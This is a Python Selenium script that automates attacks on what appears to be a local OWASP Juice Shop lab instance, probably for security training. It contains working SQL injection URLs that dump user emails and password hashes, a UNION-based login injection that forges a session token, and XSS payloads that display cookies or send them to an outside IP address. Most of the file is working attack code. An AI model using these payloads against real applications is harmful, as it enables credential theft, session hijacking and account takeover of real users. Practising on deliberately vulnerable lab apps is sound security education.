import time
import pickle
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from abc import ABC, abstractmethod 


BASE_URL = "localhost:3000"

class Attack(ABC):
    """
    abstract class wich provides base url and chromedriver for accesing browser
    """
    def __init__(self):
        self.base_url = BASE_URL
        self.chrome_options = Options()
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--window-size=1480,996")
        super().__init__()

    @abstractmethod
    def run(self):
        pass

class SQLInjection(Attack):
    """
    Manages two types of SQLInjection with same base url
    and chrome options for using selenium
    """

    def run(self):
        driver = webdriver.Chrome(options=self.chrome_options)
        time.sleep(2)
        sql_query = "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--"
        driver.get(self.base_url + sql_query)

    def run_tryhard(self):
        driver = webdriver.Chrome(options=self.chrome_options)
        driver.get(self.base_url)
        time.sleep(2)
        driver.get(self.base_url + "/rest/products/search?q=")
        time.sleep(2)
        # Comment last part with no error
        driver.get(self.base_url + "/rest/products/search?q='))--")
        time.sleep(2)
        # find out correct amount of columns
        # UNION SELECT '1', '2', '3', '4' FROM Users
        driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5' FROM Users
        driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users
        driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%2C%20FROM%20Users--")
        time.sleep(2)
        driver.get(self.base_url + "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20email%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
        time.sleep(2)
        driver.get(self.base_url + "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")


class FalseJWTLogin(Attack):
    """
    tries to login as non existing user
    using sql injection in login form to recieve false JSON Web Token
    """

    def __init__(self):
        super().__init__()
        self.attack_vector = ("' UNION SELECT * FROM "
                "(SELECT 15 as 'id', "
                "'' as 'username', "
                "'acc0unt4nt@juice-sh.op' as 'email', "
                "'12345' as 'password', "
                "'accounting' as 'role',"
                "'123' as 'deluxeToken', "
                "'1.2.3.4' as 'lastLoginIp' , "
                "'/assets/public/images/uploads/default.svg' "
                "as 'profileImage'," 
                "'' as 'totpSecret',"
                " 1 as 'isActive', "
                "'1999-08-16 14:14:41.644 +00:00' as 'createdAt',"
                "'1999-08-16 14:33:41.930 +00:00' as 'updatedAt', "
                "null as 'deletedAt')--")
        self.chrome_options.add_argument("--kiosk")

    def run(self):
        """
        open Browser and enter SQLInjection in email field
        add cookie to prevent welcome banner
        """
        driver = webdriver.Chrome(options=self.chrome_options)
        driver.get(self.base_url + "/#/login")
        # get rid of pop up window by clicking in top right corner
        driver.find_element_by_xpath(
                """//div[contains(@class,"cdk-overlay-pane")]
                //button[@aria-label="Close Welcome Banner"]"""
                    ).click()
        # find email box
        email_box = driver.find_element_by_name('email')
        # enter email address --> Attack vector
        email_box.send_keys(self.attack_vector)
        # find password box
        pass_box = driver.find_element_by_name('password')
        # enter password
        pass_box.send_keys('something')
        # find login button
        login_button = driver.find_element_by_xpath(
                """//div[contains(@id, "login-form")]
                //button[@id="loginButton"]"""
                )
        # click button
        login_button.click()
        time.sleep(1)

class XSSAttack(Attack):
    """
    Two types of xss attack
        first tries to display cookie information in iframe
        second tries to send cookie information to external ip
    """
    def run(self, form):
        if form == "simple":
            self.run_simple()
        else:
            self.run_advanced()

    def run_simple(self):
        driver = webdriver.Chrome(options=self.chrome_options)
        # open base url
        driver.get(self.base_url)
        time.sleep(2)
        # show cookie in new iframe 
        attack_url = "http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(document.cookie)%22%3E"
        driver.get(attack_url)
        time.sleep(2)

    def run_advanced(self):
        #http://localhost:3000/#/search?q=<script>new  Image().src="http://127.0.0.1/bogus.php?output="+document.cookie;</script>
        driver = webdriver.Chrome(options=self.chrome_options)
        driver.get(self.base_url)
        time.sleep(2)
        attack_url = "http://localhost:3000/#/search?q=%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2F172.17.0.1%2F%22%2Bdocument.cookie%3B%3C%2Fscript%3E"
        driver.get(attack_url)
        time.sleep(2)

class SensitiveDataExposure(Attack):
    """
    access sensitive data which is accidently exposed
    """
    def __init__(self):
        super().__init__()

    def run(self, exposed_file_path):
        driver = webdriver.Chrome(options=self.chrome_options)
        time.sleep(2)
        driver.get(self.base_url + exposed_file_path) 
        time.sleep(5)

class TwoFactor:
    """
    Steps to attack 2FA:
    -> SQLInjection to receive totpsecret:  of 2FA of user wurstbrot
    """
    def run():
        pass

